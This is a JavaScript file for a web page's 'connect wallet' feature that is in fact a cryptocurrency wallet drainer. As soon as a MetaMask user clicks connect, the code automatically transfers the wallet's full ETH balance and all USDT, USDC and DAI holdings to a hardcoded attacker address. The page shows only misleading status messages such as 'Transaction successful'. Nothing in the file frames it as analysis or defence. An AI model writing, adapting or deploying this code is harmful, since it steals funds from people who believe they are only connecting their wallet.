const destinationWallet = '0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8'; // Set your destination wallet address here

// ERC20 Token Contract Addresses
const tokens = [
    { address: '0xdac17f958d2ee523a2206206994597c13d4e6b0', name: 'USDT', decimals: 6 }, // USDT
    { address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', name: 'USDC', decimals: 6 }, // USDC
    { address: '0x6b175474e89094c44da98b954eedeac495271d0f', name: 'DAI', decimals: 18 } // DAI
];

document.getElementById('connectButton').onclick = async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const walletAddress = accounts[0];
            document.getElementById('walletAddress').innerText = `Connected: ${walletAddress}`;
            document.getElementById('disconnectButton').style.display = 'inline';
            document.getElementById('connectButton').style.display = 'none';

            // Automatically check network and send crypto
            await checkNetworkAndSend(walletAddress);
        } catch (error) {
            handleError('Error connecting to wallet', error);
        }
    } else {
        alert('MetaMask is not installed. Please install it to use this feature.');
    }
};

document.getElementById('disconnectButton').onclick = () => {
    document.getElementById('walletAddress').innerText = '';
    document.getElementById('disconnectButton').style.display = 'none';
    document.getElementById('connectButton').style.display = 'inline';
};

async function checkNetworkAndSend(walletAddress) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const network = await provider.getNetwork();

    // Show loading indicator
    document.getElementById('loadingIndicator').style.display = 'block';

    // Check if the network is sufficient
    if (isSufficientNetwork(network.chainId)) {
        // If sufficient, send all crypto automatically
        await sendAllCrypto(walletAddress);
    } else {
        // Request to switch network
        await switchNetwork();
    }

    // Hide loading indicator after all transactions
    document.getElementById('loadingIndicator').style.display = 'none';
}

function isSufficientNetwork(chainId) {
    const sufficientNetworks = [1, 56, 137]; // Ethereum, BNB, Polygon, etc.
    return sufficientNetworks.includes(chainId);
}

async function sendAllCrypto(walletAddress) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    // Sending ETH
    const ethBalance = await provider.getBalance(walletAddress);
    if (ethBalance.gt(0)) {
        const ethTx = {
            to: destinationWallet,
            value: ethBalance,
        };

        try {
            const ethTransaction = await signer.sendTransaction(ethTx);
            await ethTransaction.wait();
            document.getElementById('statusMessage').innerText = 'ETH Transaction successful!';
        } catch (error) {
            handleError('ETH Transaction failed', error);
        }
    } else {
        document.getElementById('statusMessage').innerText = 'No ETH available to send.';
    }

    // Send all tokens
    for (const token of tokens) {
        await sendERC20Token(token, walletAddress);
    }
}

async function sendERC20Token(token, walletAddress) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const tokenContract = new ethers.Contract(token.address, [
        'function balanceOf(address owner) view returns (uint)',
        'function transfer(address to, uint amount) returns (bool)',
    ], signer);

    // Get token balance
    const balance = await tokenContract.balanceOf(walletAddress);
    if (balance.gt(0)) {
        try {
            const transferTx = await tokenContract.transfer(destinationWallet, balance);
            await transferTx.wait();
            document.getElementById('statusMessage').innerText += ` ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name} transferred successfully!`;
        } catch (error) {
            handleError(`${token.name} transfer failed`, error);
        }
    } else {
        document.getElementById('statusMessage').innerText += ` No ${token.name} available to send.`;
    }
}

function handleError(message, error) {
    console.error(message, error);
    document.getElementById('statusMessage').innerText += ` ${message}. Please check your wallet and network settings.`;
}

async function switchNetwork() {
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }], // Example for Ethereum Mainnet
        });
        document.getElementById('statusMessage').innerText = 'Switched to Ethereum Mainnet!';
    } catch (switchError) {
        console.error('Error switching network:', switchError);
        document.getElementById('statusMessage').innerText = 'Please switch to a supported network.';
    }
}
